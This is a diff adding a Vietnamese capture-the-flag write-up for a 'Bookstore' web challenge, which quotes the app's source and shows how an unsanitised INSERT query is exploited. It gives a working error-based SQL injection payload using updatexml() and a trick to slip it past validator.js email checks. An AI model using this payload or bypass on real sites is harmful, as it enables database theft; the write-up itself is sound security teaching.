@@ -137,3 +137,104 @@ page = await browser.newPage();
 ```
 ![real-flag.png](real-flag.png)
 > **_FLAG:_**  maple{g00segoHONK}
+
+
+## Bookstore
+
+Challange cho ta 1 trang web và source code. Ta có thể dựng lại challenge  bằng docker
+
+Truy cập vào trang web của challange có 1 form login và register
+
+Sau khi đăng ký ta tiến hành login sẽ hiển thị 1 danh sách các sách để purchase. Purchase xong ta có thể cung cấp email để download sách về
+
+Khi đọc source code ta thấy:
+```javascript
+app.post('/download-ebook', (req, res) => {
+    const option = req.body?.option ?? '';
+    const email = req.body?.email ?? '';
+    const bookID = req.body?.bookID ?? 1;
+    const user = req.session?.user ?? { books: [] };
+    if (!validBooks.find(book => book.id == bookID)) {
+        res.send('Invalid book ID');
+        return;
+    } /* else if (!user.books.includes(bookID)) {
+        res.send('You do not have this book');
+        return;
+    } */
+
+    switch (option) {
+        case 'direct':
+            res.write('Direct downloads currently unavailable. Please wait until the established publish date!');
+            break;
+        case 'kindle':
+            if (validateEmail(email)) {
+                db.insertEmail(email, bookID).then((err) => {
+                    if (err) {
+                        res.send('Error: ' + err);
+                    } else {
+                        res.send("Email saved! We'll send you a download link once the book has been published!")
+                    }
+                }).catch((err) => {
+                    res.send('Error: ' + err);
+                })
+            } else {
+                res.send("Invalid email address")
+            }
+            break;
+        default:
+            res.send('Invalid option');
+            break;
+    }
+});
+```
+**/download-ebook** sẽ dùng hàm insertEmail() từ db.js
+
+Hàm insertEmail():
+```javascript
+insertEmail(email, book_id) {
+        const query = `INSERT INTO requests(email, book_id) VALUES('${email}', '${book_id}');`;
+        return new Promise((resolve, reject) => {
+            this.db.query(query, (error) => {
+                if (error != null) {
+                    reject(error);
+                } else {
+                    resolve(null);
+                }
+            })
+        })
+    }
+```
+Ta có thể lợi dụng hàm này để truyền vào payload thực hiện SQL injection thông qua việc input email
+
+Đầu tiên challange có validate email bằng hàm [isEmail](https://github.com/validatorjs/validator.js/blob/master/src/lib/isEmail.js) nên ta cần phải bypass, trong source code của [isEmail](https://github.com/validatorjs/validator.js/blob/master/src/lib/isEmail.js)ta thấy dòng code sau:
+```javascript
+ if (user[0] === '"') {
+    user = user.slice(1, user.length - 1);
+    return options.allow_utf8_local_part ?
+      quotedEmailUserUtf8.test(user) :
+      quotedEmailUser.test(user);
+  }
+```
+Ta có thể dùng " ' để bypass
+
+Nhìn qua file **init.sql** ta sẽ thấy flag được lưu trong table **books**
+```mysql
+INSERT INTO books(title, author, price, texts) VALUES('Maple Stories', 'Maple-Chan', 0, 'FLAGE');
+```
+Ta sẽ dùng [updatexml()](https://clbuezzz.wordpress.com/2021/12/28/xpath-error-based-injection-using-extractvalue-update-xml/) để thực hiện error-base sqli để đọc được flag
+>**_updatexml()_**: là hàm sẽ thực hiện truy vấn XPath với một chuỗi đại diện cho data XML, trong đó param đầu tiên sẽ là XML data nếu nó sai syntax thì sẽ xuất hiện error message với param thứ 2 sẽ được thực thi
+
+>**_XPATH_**: [XML Path Language](https://www.w3schools.com/xml/xml_xpath.asp) được sử dụng để 
+điều hướng qua các elements và attributes trong tài liệu XML
+
+Payload:
+```bash
+"',updatexml(1,concat(1,(select texts from books limit 1)),1))#@c.cc
+```
+Trong đó:
+- " ' và #@c.cc để bypass qua email validation
+- concat(1,(select texts from books limit 1)) để đọc flag từ table books
+
+Kết quả:
+![sqli-flag.png](spli-flag.png)
+>**_Flag:_** maple{it_was_all_just_maple_leaf}
